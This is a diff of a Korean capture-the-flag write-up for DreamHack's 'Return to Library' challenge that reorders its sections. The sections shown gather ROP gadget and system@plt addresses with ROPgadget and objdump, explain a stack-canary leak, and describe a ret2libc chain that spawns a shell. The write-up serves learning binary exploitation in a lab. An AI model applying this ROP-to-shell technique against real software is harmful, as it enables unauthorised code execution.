@@ -8,38 +8,7 @@
   <img src="assets/rtl/challenge.png" width="420" alt="DreamHack Return to Library 문제 페이지 제목" />
 </p>
 
-### 2. 실행 시 주의 — 로컬에 ELF 바이너리가 있어야 한다
-
-익스 코드 첫 줄 `e = ELF('./rtl')`은 **로컬 바이너리 파일을 읽어** `system@plt` 같은 주소를 뽑는다. 따라서 실행하는 위치(여기서는 도커 컨테이너의 작업 폴더)에 **`rtl` 파일이 반드시 있어야** 한다.
-
-이 바이너리는 `No PIE (0x400000)`라 주소가 고정이므로, 로컬에서 뽑은 주소를 원격에도 그대로 쓴다.
-
-### 3. 주소 확인 — 가젯과 함수 주소 수집
-
-페이로드에 필요한 주소 4개를 `ROPgadget`·`objdump`로 수집한다.
-
-<p align="center">
-  <img src="assets/rtl/addresses.png" width="820" alt="ROPgadget로 /bin/sh·pop rdi·ret, objdump로 system@plt 주소를 찾는 터미널" />
-</p>
-
-```bash
-ROPgadget --binary ./rtl --string "/bin/sh"   # /bin/sh 문자열
-ROPgadget --binary ./rtl | grep "pop rdi"     # pop rdi ; ret 가젯
-ROPgadget --binary ./rtl | grep ": ret"       # 단독 ret 가젯 (정렬용)
-objdump -d ./rtl | grep "<system@plt>:"       # system@plt
-```
-
-| 용도 | 주소 | 비고 |
-|---|---|---|
-| `"/bin/sh"` 문자열 | `0x400874` | `system`의 인자 |
-| `pop rdi ; ret` | `0x400853` | 스택 값을 `rdi`로 옮기는 가젯 |
-| `ret` | `0x400596` | 스택 정렬 보정용 (단독 `ret`이면 아무거나) |
-| `system@plt` | `0x4005d0` | `system` 호출 |
-
-- **`system@plt`를 쓰는 이유**: 동적 링크 바이너리라 `system` 본체는 libc에 있고 실행 때마다 위치가 바뀐다. 그래서 바이너리 안 고정 주소인 **PLT**(Procedure Linkage Table, 외부 함수로 가는 관문)를 호출하면, 내부적으로 실제 `system`으로 연결된다.
-- **`/bin/sh`가 바이너리 안에 있는 이유**: 소스에서 `const char *binsh = "/bin/sh";`로 문자열을 넣어 뒀기 때문에 `search`/`ROPgadget`로 바로 찾을 수 있다. (`search`로 찾으면 읽기·실행 매핑과 읽기·쓰기 매핑에 같은 문자열이 두 주소로 보이기도 하는데, 실제 파일상 문자열은 하나다.)
-
-### 4. 익스플로잇 코드
+### 2. 익스플로잇 코드
 
 카나리를 leak해 복원한 뒤(앞선 문제에서 다룬 방식), 반환 주소부터 `ret → pop rdi → /bin/sh → system@plt`로 ROP 체인을 올린다.
 
@@ -79,7 +48,36 @@ p.sendafter(b'Buf: ', payload)
 p.interactive()
 ```
 
-코드에서 짚을 점만 간단히:
+아래는 이 코드에서 쓰는 주소가 어디서 나왔고, 각 줄이 무엇을 하는지 본 것이다.
+
+### 3. 코드의 주소는 어디서 왔나 — 가젯·함수 주소 수집
+
+페이로드에 필요한 주소 4개를 `ROPgadget`·`objdump`로 수집한다.
+
+<p align="center">
+  <img src="assets/rtl/addresses.png" width="820" alt="ROPgadget로 /bin/sh·pop rdi·ret, objdump로 system@plt 주소를 찾는 터미널" />
+</p>
+
+```bash
+ROPgadget --binary ./rtl --string "/bin/sh"   # /bin/sh 문자열
+ROPgadget --binary ./rtl | grep "pop rdi"     # pop rdi ; ret 가젯
+ROPgadget --binary ./rtl | grep ": ret"       # 단독 ret 가젯 (정렬용)
+objdump -d ./rtl | grep "<system@plt>:"       # system@plt
+```
+
+| 용도 | 주소 | 비고 |
+|---|---|---|
+| `"/bin/sh"` 문자열 | `0x400874` | `system`의 인자 |
+| `pop rdi ; ret` | `0x400853` | 스택 값을 `rdi`로 옮기는 가젯 |
+| `ret` | `0x400596` | 스택 정렬 보정용 (단독 `ret`이면 아무거나) |
+| `system@plt` | `0x4005d0` | `system` 호출 |
+
+- **`system@plt`를 쓰는 이유**: 동적 링크 바이너리라 `system` 본체는 libc에 있고 실행 때마다 위치가 바뀐다. 그래서 바이너리 안 고정 주소인 **PLT**(Procedure Linkage Table, 외부 함수로 가는 관문)를 호출하면, 내부적으로 실제 `system`으로 연결된다.
+- **`/bin/sh`가 바이너리 안에 있는 이유**: 소스에서 `const char *binsh = "/bin/sh";`로 문자열을 넣어 뒀기 때문에 `search`/`ROPgadget`로 바로 찾을 수 있다. (`search`로 찾으면 읽기·실행 매핑과 읽기·쓰기 매핑에 같은 문자열이 두 주소로 보이기도 하는데, 실제 파일상 문자열은 하나다.)
+
+이 바이너리는 `No PIE (0x400000)`라 주소가 고정이므로, 로컬에서 뽑은 주소를 원격에도 그대로 쓴다. 또한 `e = ELF('./rtl')`은 로컬 바이너리 파일을 읽어 `system@plt` 같은 주소를 뽑으므로, 실행하는 위치(도커 컨테이너 작업 폴더)에 `rtl` 파일이 반드시 있어야 한다.
+
+### 4. 코드 설명 — 카나리 leak과 payload
 
 - **`sendafter(b'Buf: ', ...)`** = `Buf: ` 출력을 기다렸다가 그 뒤에 입력을 보냄. **`recvuntil(buf)`** = 방금 보낸 입력이 그대로 에코된 부분을 걷어내 수신 커서를 카나리 **바로 앞**에 맞춤.
 - **`u64(b'\x00' + p.recvn(7))`** — 카나리는 8바이트인데 최하위 바이트가 항상 `\x00`이라 출력이 거기서 끊긴다. 흘러나온 위쪽 7바이트 앞에 `\x00`을 다시 붙여 8바이트로 복원. (`recvn(7)`은 개행과 무관하게 **정확히 7바이트** 수신, `u64`는 바이트→숫자 **u**npack, `p64`는 숫자→바이트 **p**ack.)
